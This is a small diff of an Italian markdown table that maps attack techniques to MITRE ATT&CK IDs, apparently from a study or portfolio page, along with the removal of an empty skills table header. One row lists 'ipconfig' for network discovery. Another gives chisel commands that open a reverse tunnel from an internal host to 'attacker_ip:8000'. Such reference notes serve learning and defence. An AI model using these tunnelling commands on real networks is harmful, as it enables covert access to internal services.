@@ -15,6 +15,3 @@ I numeri MITRE ATT&CK associati a queste tecniche possono variare a seconda dell
 | Discovery:                         | [T1016: System Network Configuration Discovery, Technique](https://attack.mitre.org/techniques/T1016/)                     | `ipconfig`                                                                                            |                                                                                                                                      |
 | Command & Control/Proxy:           | [T1090.003: Proxy: Multi-hop Proxy, Sub-technique](https://attack.mitre.org/techniques/T1090/003/)                         | `chisel client attacker_ip:8000 R:8080:127.0.0.1:80`<br><br>`chisel server --reverse --port 8000`<br> |                                                                                                                                      |
 
-
-| Skill                                         | Associated Project         |
-|-----------------------------------------------|----------------------------|
